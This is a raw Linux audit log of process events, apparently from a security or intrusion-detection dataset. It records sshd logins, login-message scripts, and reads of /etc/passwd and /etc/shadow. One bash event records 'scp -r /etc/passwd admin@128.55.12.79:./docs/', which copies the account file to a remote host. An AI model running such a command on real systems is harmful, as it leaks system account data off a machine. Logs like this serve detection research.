1557239451.498:202268021,0711EAD8-35D2-F19F-2777-36E1122F6E0A:sh,EXECUTE,53CC2A11-80CE-4388-512E-71CA865B3D75,env,null
1557239451.498:202268015,641B29D1-6C1C-2BB4-529F-3FB50BCE5C27:sh,FORK,0711EAD8-35D2-F19F-2777-36E1122F6E0A,sh,null
1557239451.498:202267965,E439DEFF-3AC6-C669-830D-5DC94B821CF3:sshd,EXECUTE,641B29D1-6C1C-2BB4-529F-3FB50BCE5C27,sh,null
1557239451.498:202267904,3342DCB6-7382-C568-10B4-A22F23B6581E:sshd,FORK,E439DEFF-3AC6-C669-830D-5DC94B821CF3,sshd,null
1557239451.498:202267895,3342DCB6-7382-C568-10B4-A22F23B6581E:sshd,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239451.478:202267499,3342DCB6-7382-C568-10B4-A22F23B6581E:sshd,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239451.474:202267448,3342DCB6-7382-C568-10B4-A22F23B6581E:sshd,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239451.474:202267436,0F3ABF7F-81DD-2728-24DA-06508E1F7C4E:sshd,CHANGE_PRINCIPAL,3342DCB6-7382-C568-10B4-A22F23B6581E,sshd,null
1557239451.474:202267435,0CC4CFD8-EA22-0D7E-282A-E4F5B4349530:sshd,CHANGE_PRINCIPAL,0F3ABF7F-81DD-2728-24DA-06508E1F7C4E,sshd,null
1557239451.474:202267434,0F3ABF7F-81DD-2728-24DA-06508E1F7C4E:sshd,CHANGE_PRINCIPAL,0CC4CFD8-EA22-0D7E-282A-E4F5B4349530,sshd,null
1557239451.474:202267433,3342DCB6-7382-C568-10B4-A22F23B6581E:sshd,CHANGE_PRINCIPAL,0F3ABF7F-81DD-2728-24DA-06508E1F7C4E,sshd,null
1557239451.474:202267431,3342DCB6-7382-C568-10B4-A22F23B6581E:sshd,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239451.474:202267417,3342DCB6-7382-C568-10B4-A22F23B6581E:sshd,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239451.474:202267377,3342DCB6-7382-C568-10B4-A22F23B6581E:sshd,MMAP,6C077190-DBB6-664D-8280-B3D04B5DC371,/etc/shadow,null
1557239451.474:202267374,3342DCB6-7382-C568-10B4-A22F23B6581E:sshd,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239451.458:202267325,3342DCB6-7382-C568-10B4-A22F23B6581E:sshd,MMAP,6C077190-DBB6-664D-8280-B3D04B5DC371,/etc/shadow,null
1557239451.458:202267321,3342DCB6-7382-C568-10B4-A22F23B6581E:sshd,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239451.354:202266949,3342DCB6-7382-C568-10B4-A22F23B6581E:sshd,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239451.354:202266904,3342DCB6-7382-C568-10B4-A22F23B6581E:sshd,READ,ED1F91C8-517C-6835-0835-43FA2A19771C,/etc/hosts,null
1557239451.354:202266903,3342DCB6-7382-C568-10B4-A22F23B6581E:sshd,READ,ED1F91C8-517C-6835-0835-43FA2A19771C,/etc/hosts,null
1557239451.258:202266547,3342DCB6-7382-C568-10B4-A22F23B6581E:sshd,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239451.250:202266276,B53FBF47-DB2C-FA14-48E5-CAE7FDFC7CFC:sshd,EXECUTE,3342DCB6-7382-C568-10B4-A22F23B6581E,sshd,null
1557239451.250:202266255,3E8119A1-F9B4-0931-53D3-3FF11EEA5228:sshd,FORK,B53FBF47-DB2C-FA14-48E5-CAE7FDFC7CFC,sshd,null
1557239444.102:202252249,FBCB0C7B-9B2C-EA7C-1C22-8344F6343E4F:sshd,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239444.098:202252118,6A79E3B7-B543-939D-D196-0AB9CEB9460E:sshd,CHANGE_PRINCIPAL,FBCB0C7B-9B2C-EA7C-1C22-8344F6343E4F,sshd,null
1557239444.098:202252117,6A79E3B7-B543-939D-D196-0AB9CEB9460E:sshd,CHANGE_PRINCIPAL,6A79E3B7-B543-939D-D196-0AB9CEB9460E,sshd,null
1557239444.098:202252116,FBCB0C7B-9B2C-EA7C-1C22-8344F6343E4F:sshd,CHANGE_PRINCIPAL,6A79E3B7-B543-939D-D196-0AB9CEB9460E,sshd,null
1557239444.098:202252082,FBCB0C7B-9B2C-EA7C-1C22-8344F6343E4F:sshd,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239425.438:202203264,FCFAD165-2466-0084-608D-0C339DE14D16:top,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239425.438:202203249,FCFAD165-2466-0084-608D-0C339DE14D16:top,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239425.438:202203198,FCFAD165-2466-0084-608D-0C339DE14D16:top,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239425.438:202203171,FCFAD165-2466-0084-608D-0C339DE14D16:top,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239425.438:202203048,FCFAD165-2466-0084-608D-0C339DE14D16:top,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239425.434:202202985,FCFAD165-2466-0084-608D-0C339DE14D16:top,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239425.434:202202976,FCFAD165-2466-0084-608D-0C339DE14D16:top,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239425.434:202202967,FCFAD165-2466-0084-608D-0C339DE14D16:top,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239425.434:202202934,FCFAD165-2466-0084-608D-0C339DE14D16:top,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239425.434:202202781,FCFAD165-2466-0084-608D-0C339DE14D16:top,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239425.434:202202772,FCFAD165-2466-0084-608D-0C339DE14D16:top,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239425.434:202202741,FCFAD165-2466-0084-608D-0C339DE14D16:top,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239425.422:202202057,FCFAD165-2466-0084-608D-0C339DE14D16:top,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239425.418:202201886,998E4277-995C-4284-631F-02E03172CECD:bash,EXECUTE,FCFAD165-2466-0084-608D-0C339DE14D16,b'top',null
1557239425.418:202201880,A985ECDE-6595-49A3-CDF6-841428056466:bash,FORK,998E4277-995C-4284-631F-02E03172CECD,bash,null
1557239425.138:202198701,A985ECDE-6595-49A3-CDF6-841428056466:bash,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239425.138:202198618,D3F42669-3A9B-7BFC-2F2A-5985FB7C39AD:sshd,EXECUTE,A985ECDE-6595-49A3-CDF6-841428056466,bash,null
1557239425.138:202198486,8E138B88-4DC3-E565-9861-88E08ACECAED:sshd,FORK,D3F42669-3A9B-7BFC-2F2A-5985FB7C39AD,sshd,null
1557239425.138:202198436,FBCB0C7B-9B2C-EA7C-1C22-8344F6343E4F:sshd,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239425.138:202198430,FBCB0C7B-9B2C-EA7C-1C22-8344F6343E4F:sshd,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239425.134:202198410,5E80920A-AFBD-DC26-B0B6-17E2A689F112:sshd,CHANGE_PRINCIPAL,8E138B88-4DC3-E565-9861-88E08ACECAED,sshd,null
1557239425.134:202198388,CB79BC8D-A029-D99E-727D-F31B61D05292:sshd,CHANGE_PRINCIPAL,5E80920A-AFBD-DC26-B0B6-17E2A689F112,sshd,null
1557239425.134:202198385,FBCB0C7B-9B2C-EA7C-1C22-8344F6343E4F:sshd,FORK,CB79BC8D-A029-D99E-727D-F31B61D05292,sshd,null
1557239425.134:202198376,FBCB0C7B-9B2C-EA7C-1C22-8344F6343E4F:sshd,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239425.134:202198340,FBCB0C7B-9B2C-EA7C-1C22-8344F6343E4F:sshd,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239425.134:202198337,FBCB0C7B-9B2C-EA7C-1C22-8344F6343E4F:sshd,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239425.134:202198334,FBCB0C7B-9B2C-EA7C-1C22-8344F6343E4F:sshd,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239425.090:202196190,17EB2C0E-F8F2-A70C-9EB2-E64B04569B63:lsb_release,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239425.078:202195940,B3C6DB99-47B1-35FF-0CC0-3F9C41B7A09A:91-release-upgr,EXECUTE,17EB2C0E-F8F2-A70C-9EB2-E64B04569B63,lsb_release,null
1557239425.078:202195929,2111112B-3441-3F24-8BB9-A1CBADE9CF93:91-release-upgr,FORK,B3C6DB99-47B1-35FF-0CC0-3F9C41B7A09A,91-release-upgr,null
1557239425.078:202195921,6B89F455-2958-E871-9D2D-44158554EF66:91-release-upgr,FORK,2111112B-3441-3F24-8BB9-A1CBADE9CF93,91-release-upgr,null
1557239425.078:202195894,E64A4BFA-D770-02FA-F2C2-E5753B6A10CA:run-parts,EXECUTE,6B89F455-2958-E871-9D2D-44158554EF66,91-release-upgr,null
1557239425.078:202195892,28970B47-ECA9-2B1C-E634-206F4C13ECD6:run-parts,FORK,E64A4BFA-D770-02FA-F2C2-E5753B6A10CA,run-parts,null
1557239424.926:202187555,CE57760C-824C-2878-7621-F152332EDE6C:landscape-sysin,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239424.910:202187118,8215C9A5-BD04-F2B0-8EAB-06508601015F:50-landscape-sy,EXECUTE,CE57760C-824C-2878-7621-F152332EDE6C,landscape-sysin,null
1557239424.910:202187111,9ED8D43F-BE04-1F28-FEAF-F6E842FDA098:50-landscape-sy,FORK,8215C9A5-BD04-F2B0-8EAB-06508601015F,50-landscape-sy,null
1557239424.902:202186852,AD7413A1-5818-3588-0CA7-7ED96EC74447:run-parts,EXECUTE,9ED8D43F-BE04-1F28-FEAF-F6E842FDA098,50-landscape-sy,null
1557239424.902:202186849,28970B47-ECA9-2B1C-E634-206F4C13ECD6:run-parts,FORK,AD7413A1-5818-3588-0CA7-7ED96EC74447,run-parts,null
1557239424.894:202186467,007FA1BA-5035-60B2-FCED-DDDEF93D7DB7:env,EXECUTE,28970B47-ECA9-2B1C-E634-206F4C13ECD6,run-parts,null
1557239424.894:202186436,2BA2D321-F930-F155-F987-002EFC30963E:sh,EXECUTE,007FA1BA-5035-60B2-FCED-DDDEF93D7DB7,env,null
1557239424.894:202186429,DA155711-C301-16EA-2923-A519BE4CF174:sh,FORK,2BA2D321-F930-F155-F987-002EFC30963E,sh,null
1557239424.894:202186378,B0450115-FA7F-FADD-E6A7-4E477266A00F:sshd,EXECUTE,DA155711-C301-16EA-2923-A519BE4CF174,sh,null
1557239424.894:202186346,FBCB0C7B-9B2C-EA7C-1C22-8344F6343E4F:sshd,FORK,B0450115-FA7F-FADD-E6A7-4E477266A00F,sshd,null
1557239424.894:202186317,FBCB0C7B-9B2C-EA7C-1C22-8344F6343E4F:sshd,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239424.874:202186157,FBCB0C7B-9B2C-EA7C-1C22-8344F6343E4F:sshd,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239424.874:202186101,FBCB0C7B-9B2C-EA7C-1C22-8344F6343E4F:sshd,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239424.874:202186088,09CCB595-0996-6EF6-4EC4-437257360624:sshd,CHANGE_PRINCIPAL,FBCB0C7B-9B2C-EA7C-1C22-8344F6343E4F,sshd,null
1557239424.874:202186087,4352B643-74C9-CF30-1E2B-95F045B8CF49:sshd,CHANGE_PRINCIPAL,09CCB595-0996-6EF6-4EC4-437257360624,sshd,null
1557239424.874:202186085,09CCB595-0996-6EF6-4EC4-437257360624:sshd,CHANGE_PRINCIPAL,4352B643-74C9-CF30-1E2B-95F045B8CF49,sshd,null
1557239424.874:202186084,FBCB0C7B-9B2C-EA7C-1C22-8344F6343E4F:sshd,CHANGE_PRINCIPAL,09CCB595-0996-6EF6-4EC4-437257360624,sshd,null
1557239424.874:202186082,FBCB0C7B-9B2C-EA7C-1C22-8344F6343E4F:sshd,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239424.874:202186067,FBCB0C7B-9B2C-EA7C-1C22-8344F6343E4F:sshd,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239424.870:202186018,FBCB0C7B-9B2C-EA7C-1C22-8344F6343E4F:sshd,MMAP,6C077190-DBB6-664D-8280-B3D04B5DC371,/etc/shadow,null
1557239424.870:202186015,FBCB0C7B-9B2C-EA7C-1C22-8344F6343E4F:sshd,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239424.862:202185985,FBCB0C7B-9B2C-EA7C-1C22-8344F6343E4F:sshd,MMAP,6C077190-DBB6-664D-8280-B3D04B5DC371,/etc/shadow,null
1557239424.862:202185982,FBCB0C7B-9B2C-EA7C-1C22-8344F6343E4F:sshd,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239424.758:202185602,FBCB0C7B-9B2C-EA7C-1C22-8344F6343E4F:sshd,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239424.758:202185561,FBCB0C7B-9B2C-EA7C-1C22-8344F6343E4F:sshd,READ,ED1F91C8-517C-6835-0835-43FA2A19771C,/etc/hosts,null
1557239424.758:202185560,FBCB0C7B-9B2C-EA7C-1C22-8344F6343E4F:sshd,READ,ED1F91C8-517C-6835-0835-43FA2A19771C,/etc/hosts,null
1557239424.662:202184608,FBCB0C7B-9B2C-EA7C-1C22-8344F6343E4F:sshd,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239424.658:202184244,863A1AD4-54BD-56A1-1B6D-7A4DC3E86E14:sshd,EXECUTE,FBCB0C7B-9B2C-EA7C-1C22-8344F6343E4F,sshd,null
1557239424.654:202184218,3E8119A1-F9B4-0931-53D3-3FF11EEA5228:sshd,FORK,863A1AD4-54BD-56A1-1B6D-7A4DC3E86E14,sshd,null
1557239419.510:202172502,5FD9F63D-CDE9-0463-573A-1CD2461A2EA6:sshd,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239419.510:202172420,5FD9F63D-CDE9-0463-573A-1CD2461A2EA6:sshd,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239419.506:202172340,6D06EE94-3D24-F5E8-E0DA-2E0E23498723:sshd,CHANGE_PRINCIPAL,5FD9F63D-CDE9-0463-573A-1CD2461A2EA6,sshd,null
1557239419.506:202172339,6D06EE94-3D24-F5E8-E0DA-2E0E23498723:sshd,CHANGE_PRINCIPAL,6D06EE94-3D24-F5E8-E0DA-2E0E23498723,sshd,null
1557239419.506:202172338,5FD9F63D-CDE9-0463-573A-1CD2461A2EA6:sshd,CHANGE_PRINCIPAL,6D06EE94-3D24-F5E8-E0DA-2E0E23498723,sshd,null
1557239417.398:202167355,6F7FEC74-2CE9-FDD2-2627-0C59FF5B7C29:scp,READ,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239416.818:202166303,BE4CA5EF-7054-F5A0-9058-CCB6DFEE9EFB:ssh,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239416.818:202166300,BE4CA5EF-7054-F5A0-9058-CCB6DFEE9EFB:ssh,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239416.818:202166297,BE4CA5EF-7054-F5A0-9058-CCB6DFEE9EFB:ssh,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239416.818:202166294,BE4CA5EF-7054-F5A0-9058-CCB6DFEE9EFB:ssh,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239416.818:202166291,BE4CA5EF-7054-F5A0-9058-CCB6DFEE9EFB:ssh,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239416.818:202166288,BE4CA5EF-7054-F5A0-9058-CCB6DFEE9EFB:ssh,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239416.818:202166285,BE4CA5EF-7054-F5A0-9058-CCB6DFEE9EFB:ssh,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239416.814:202166263,BE4CA5EF-7054-F5A0-9058-CCB6DFEE9EFB:ssh,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239416.814:202166167,06096619-B3B7-65FB-97C6-1536BDBE09BE:scp,EXECUTE,BE4CA5EF-7054-F5A0-9058-CCB6DFEE9EFB,ssh,null
1557239416.814:202166158,6F7FEC74-2CE9-FDD2-2627-0C59FF5B7C29:scp,FORK,06096619-B3B7-65FB-97C6-1536BDBE09BE,scp,null
1557239416.814:202166151,6F7FEC74-2CE9-FDD2-2627-0C59FF5B7C29:scp,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239416.810:202166090,32D9AFB2-6E45-503B-755B-5C96544CAB3C:bash,EXECUTE,6F7FEC74-2CE9-FDD2-2627-0C59FF5B7C29,b'scp -r /etc/passwd admin@128.55.12.79:./docs/',null
1557239416.810:202166084,95714542-DCBE-CC60-A268-6B0B49E01619:bash,FORK,32D9AFB2-6E45-503B-755B-5C96544CAB3C,bash,null
1557239416.638:202162249,95714542-DCBE-CC60-A268-6B0B49E01619:bash,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239416.638:202162166,ADFCB23E-2B65-3FE5-3F07-59C51C71D554:sshd,EXECUTE,95714542-DCBE-CC60-A268-6B0B49E01619,bash,null
1557239416.638:202162063,A895C19D-F2CD-EC6F-D396-5FBA84248145:sshd,FORK,ADFCB23E-2B65-3FE5-3F07-59C51C71D554,sshd,null
1557239416.638:202162016,5FD9F63D-CDE9-0463-573A-1CD2461A2EA6:sshd,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239416.638:202162010,5FD9F63D-CDE9-0463-573A-1CD2461A2EA6:sshd,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239416.634:202161990,7E7E650E-3009-A49C-C386-2645A16C15AA:sshd,CHANGE_PRINCIPAL,A895C19D-F2CD-EC6F-D396-5FBA84248145,sshd,null
1557239416.634:202161968,EE1AB559-14CB-000D-97D2-F49141A6312C:sshd,CHANGE_PRINCIPAL,7E7E650E-3009-A49C-C386-2645A16C15AA,sshd,null
1557239416.634:202161965,5FD9F63D-CDE9-0463-573A-1CD2461A2EA6:sshd,FORK,EE1AB559-14CB-000D-97D2-F49141A6312C,sshd,null
1557239416.634:202161956,5FD9F63D-CDE9-0463-573A-1CD2461A2EA6:sshd,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239416.634:202161920,5FD9F63D-CDE9-0463-573A-1CD2461A2EA6:sshd,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239416.634:202161917,5FD9F63D-CDE9-0463-573A-1CD2461A2EA6:sshd,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239416.634:202161914,5FD9F63D-CDE9-0463-573A-1CD2461A2EA6:sshd,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239416.570:202160600,988C1B3E-13C5-D070-D08E-37F1F7C67DCD:hwe-support-sta,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239416.562:202160368,61F5A8A9-0536-CEDA-A37F-C8214B7AC579:update-motd-hwe,EXECUTE,988C1B3E-13C5-D070-D08E-37F1F7C67DCD,hwe-support-sta,null
1557239416.562:202160364,183E65BF-BDE1-E664-80D7-4FF0336FFA63:update-motd-hwe,FORK,61F5A8A9-0536-CEDA-A37F-C8214B7AC579,update-motd-hwe,null
1557239416.542:202158983,D20C69D0-E661-6AC3-3E0B-568FB763C04A:95-hwe-eol,EXECUTE,183E65BF-BDE1-E664-80D7-4FF0336FFA63,update-motd-hwe,null
1557239416.542:202158962,DE129886-DFF0-2475-0991-AF082930D8F6:run-parts,EXECUTE,D20C69D0-E661-6AC3-3E0B-568FB763C04A,95-hwe-eol,null
1557239416.542:202158961,3B2EB6E3-7893-0C64-546C-07E3E98E3BBF:run-parts,FORK,DE129886-DFF0-2475-0991-AF082930D8F6,run-parts,null
1557239416.526:202158585,D451F937-296E-2CF5-EEE0-2739286CF29A:lsb_release,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239416.518:202158330,41621CB0-6CBF-7407-4630-34D77DBFBEB9:91-release-upgr,EXECUTE,D451F937-296E-2CF5-EEE0-2739286CF29A,lsb_release,null
1557239416.518:202158319,67B365DD-238B-3D27-F325-65B5D2B1AFDC:91-release-upgr,FORK,41621CB0-6CBF-7407-4630-34D77DBFBEB9,91-release-upgr,null
1557239416.518:202158309,145C7B0A-BE92-AD2F-644C-D3A2D8AA7CD5:91-release-upgr,FORK,67B365DD-238B-3D27-F325-65B5D2B1AFDC,91-release-upgr,null
1557239416.514:202158287,3D77ED77-EE14-85E7-DE34-A7C22A58C252:run-parts,EXECUTE,145C7B0A-BE92-AD2F-644C-D3A2D8AA7CD5,91-release-upgr,null
1557239416.514:202158286,3B2EB6E3-7893-0C64-546C-07E3E98E3BBF:run-parts,FORK,3D77ED77-EE14-85E7-DE34-A7C22A58C252,run-parts,null
1557239416.378:202149832,6CB101C4-27C4-9696-1022-4A5D05416468:landscape-sysin,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239416.366:202149417,FD957523-F0D9-EB1E-0A63-50D77E23F293:50-landscape-sy,EXECUTE,6CB101C4-27C4-9696-1022-4A5D05416468,landscape-sysin,null
1557239416.366:202149410,3586B912-F7CA-D1A4-17A3-E606640031A3:50-landscape-sy,FORK,FD957523-F0D9-EB1E-0A63-50D77E23F293,50-landscape-sy,null
1557239416.362:202149157,957F1E12-EF0C-E68B-6AAF-7DC934CC98A4:run-parts,EXECUTE,3586B912-F7CA-D1A4-17A3-E606640031A3,50-landscape-sy,null
1557239416.362:202149156,3B2EB6E3-7893-0C64-546C-07E3E98E3BBF:run-parts,FORK,957F1E12-EF0C-E68B-6AAF-7DC934CC98A4,run-parts,null
1557239416.350:202148828,EC728A16-B261-034F-4D7E-83D9F2D123CE:env,EXECUTE,3B2EB6E3-7893-0C64-546C-07E3E98E3BBF,run-parts,null
1557239416.350:202148789,86DB7BD5-E8C8-6047-5049-5EF533B70248:sh,EXECUTE,EC728A16-B261-034F-4D7E-83D9F2D123CE,env,null
1557239416.350:202148778,02399B06-6292-A17B-83CD-1A94B0EBAE81:sh,FORK,86DB7BD5-E8C8-6047-5049-5EF533B70248,sh,null
1557239416.350:202148716,6962FBD0-5DDE-F2F1-33B1-BEBB687D3C97:sshd,EXECUTE,02399B06-6292-A17B-83CD-1A94B0EBAE81,sh,null
1557239416.350:202148697,5FD9F63D-CDE9-0463-573A-1CD2461A2EA6:sshd,FORK,6962FBD0-5DDE-F2F1-33B1-BEBB687D3C97,sshd,null
1557239416.350:202148671,5FD9F63D-CDE9-0463-573A-1CD2461A2EA6:sshd,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239416.326:202148278,5FD9F63D-CDE9-0463-573A-1CD2461A2EA6:sshd,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239416.322:202148226,5FD9F63D-CDE9-0463-573A-1CD2461A2EA6:sshd,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239416.322:202148214,5878590B-745F-5D6C-503D-B01052EB27FD:sshd,CHANGE_PRINCIPAL,5FD9F63D-CDE9-0463-573A-1CD2461A2EA6,sshd,null
1557239416.322:202148213,58CE8AAE-1B72-0F56-DC88-F4A6EDC30ED4:sshd,CHANGE_PRINCIPAL,5878590B-745F-5D6C-503D-B01052EB27FD,sshd,null
1557239416.322:202148212,5878590B-745F-5D6C-503D-B01052EB27FD:sshd,CHANGE_PRINCIPAL,58CE8AAE-1B72-0F56-DC88-F4A6EDC30ED4,sshd,null
1557239416.322:202148211,5FD9F63D-CDE9-0463-573A-1CD2461A2EA6:sshd,CHANGE_PRINCIPAL,5878590B-745F-5D6C-503D-B01052EB27FD,sshd,null
1557239416.322:202148209,5FD9F63D-CDE9-0463-573A-1CD2461A2EA6:sshd,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239416.322:202148195,5FD9F63D-CDE9-0463-573A-1CD2461A2EA6:sshd,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239416.322:202148155,5FD9F63D-CDE9-0463-573A-1CD2461A2EA6:sshd,MMAP,6C077190-DBB6-664D-8280-B3D04B5DC371,/etc/shadow,null
1557239416.322:202148152,5FD9F63D-CDE9-0463-573A-1CD2461A2EA6:sshd,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239416.310:202148107,5FD9F63D-CDE9-0463-573A-1CD2461A2EA6:sshd,MMAP,6C077190-DBB6-664D-8280-B3D04B5DC371,/etc/shadow,null
1557239416.310:202148104,5FD9F63D-CDE9-0463-573A-1CD2461A2EA6:sshd,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239416.206:202147716,5FD9F63D-CDE9-0463-573A-1CD2461A2EA6:sshd,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239416.206:202147684,5FD9F63D-CDE9-0463-573A-1CD2461A2EA6:sshd,READ,ED1F91C8-517C-6835-0835-43FA2A19771C,/etc/hosts,null
1557239416.206:202147683,5FD9F63D-CDE9-0463-573A-1CD2461A2EA6:sshd,READ,ED1F91C8-517C-6835-0835-43FA2A19771C,/etc/hosts,null
1557239416.106:202147324,5FD9F63D-CDE9-0463-573A-1CD2461A2EA6:sshd,MMAP,567E1A4F-1E32-352D-BE61-EB3CED29AB38,/etc/passwd,null
1557239416.102:202147056,DC7994AD-ABF4-0517-A2B8-918DB2CBC42C:sshd,EXECUTE,5FD9F63D-CDE9-0463-573A-1CD2461A2EA6,sshd,null
